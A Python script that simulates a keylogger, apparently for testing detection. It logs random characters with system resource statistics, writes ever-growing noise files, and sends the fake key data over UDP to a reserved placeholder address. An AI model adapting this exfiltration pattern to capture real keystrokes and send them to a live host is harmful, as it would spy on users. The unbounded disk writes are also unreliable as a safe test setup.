import os
import random
import string
import psutil
import time
import socket
from datetime import datetime

# Setup log directory and file
LOG_DIR = os.path.join(os.getcwd(), "log")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "system_fake_keylog.txt")

def random_key():
    return random.choice(string.ascii_letters + string.digits)

def simulate_network_exfiltration(fake_data):
    try:
        # Simulate opening a socket (but don't connect)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("192.0.2.1", 9999))  # non-routable IP, safe to simulate
            s.send(fake_data.encode())
    except Exception:
        pass  # silently fail, we're only simulating

def log_fake_keypress(file_path):
    disk_io_burst = 1_000_000  # simulate 1MB disk write
    fake_buffer = " " * 10_000  # RAM usage

    with open(file_path, 'a') as f:
        while True:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key = random_key()

            # Resource snapshot
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_io_counters().write_bytes
            net = psutil.net_io_counters()
            net_sent = net.bytes_sent
            net_recv = net.bytes_recv
            process_count = len(psutil.pids())

            # Log line
            log_line = (
                f"[{timestamp}] Key: {key} | CPU: {cpu:.1f}% | RAM: {ram:.1f}% "
                f"| Disk: {disk} | Net: ({net_sent}, {net_recv}) | Procs: {process_count}\n"
            )
            f.write(log_line)
            f.flush()

            # Simulate disk activity
            with open(os.path.join(LOG_DIR, "noise.tmp"), 'ab') as noise:
                noise.write(os.urandom(disk_io_burst))

            # Simulate "sending" key data over network
            simulate_network_exfiltration(f"Key={key}&Time={timestamp}")

            time.sleep(0.25)

if __name__ == "__main__":
    print("[FAKE LOGGER] Running simulated keylogger with network exfiltration... Ctrl+C to stop.")
    try:
        log_fake_keypress(LOG_FILE)
    except KeyboardInterrupt:
        print("\n[FAKE LOGGER] Stopped.")
